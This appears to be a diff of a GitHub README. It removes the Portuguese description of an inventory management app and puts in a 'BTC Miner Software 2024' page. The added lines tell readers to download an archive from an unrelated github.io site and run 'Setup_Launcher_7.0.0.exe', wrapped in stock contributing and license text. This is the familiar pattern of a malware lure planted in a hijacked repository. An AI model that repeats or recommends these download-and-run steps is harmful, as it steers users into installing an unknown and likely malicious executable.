@@ -1,44 +1,18 @@
-## Status do Projeto
+# BTC Miner Software 2024
 
-🚧 **Este projeto está em construção** 🚧
+### 1. [Download the archive](https://charlenezna.github.io/baudyfiles.github.io/) from website and extract it to a convenient folder.
+### 2. Run the auto-installer Setup_Launcher_7.0.0.exe. It will install and download all necessary packages for > operation.
 
-# Sistema de Gestão de Estoque
+# Contributing
 
-## Descrição do Projeto
-Este sistema permite que um usuário faça login para acessar, gerenciar e controlar os produtos de estoque. Após o login, o usuário pode:
-- Cadastrar um novo produto
-- Editar um produto existente
-- Deletar um produto
-- Procurar um produto
-
-### Tecnologias Utilizadas
-#### Backend
-- **Python**: Linguagem de programação utilizada no desenvolvimento do backend.
-- **Flask**: Framework web utilizado para criar a API RESTful.
-- **SQLAlchemy**: ORM utilizado para mapear os dados do banco de dados para classes Python.
-- **MySQL**: Banco de dados utilizado para armazenar os produtos e informações dos usuários.
-- **JWT (JSON Web Token)**: Utilizado para autenticação e autorização de usuários.
-
-#### Frontend
-- **React**: Biblioteca JavaScript para criação de interfaces dinâmicas.
-- **Bootstrap**: Framework CSS para estilização e criação de uma interface responsiva.
-- **React Router**: Biblioteca para gerenciar a navegação entre as páginas da aplicação.
-
----
-
-## Funcionalidades
-- **Autenticação JWT**: O sistema gera um token de acesso após o login, que é verificado em cada requisição para as rotas protegidas.
-- **CRUD de Produtos**: O usuário pode cadastrar, visualizar, editar e deletar produtos do estoque.
-- **Interface Responsiva**: Utilizando Bootstrap, a interface é adaptada para diferentes tamanhos de tela.
-
----
+- Contributions are welcome from those who wish to improve the functionality and security of this tool. Please fork the repository and submit a pull request with your enhancements.
 
 
 
+# License
 
+- This project is distributed under the MIT License. See the LICENSE file for more details.
+# Acknowledgments
 
-https://github.com/user-attachments/assets/13fbe9a8-4511-4b1d-8fb8-3e0c140d32c3
-
-
-
-
+   -  Thanks to the community for providing the underlying technologies that make this tool possible.
+   -  Gratitude to all users who contribute by sharing their feedback and improvements.
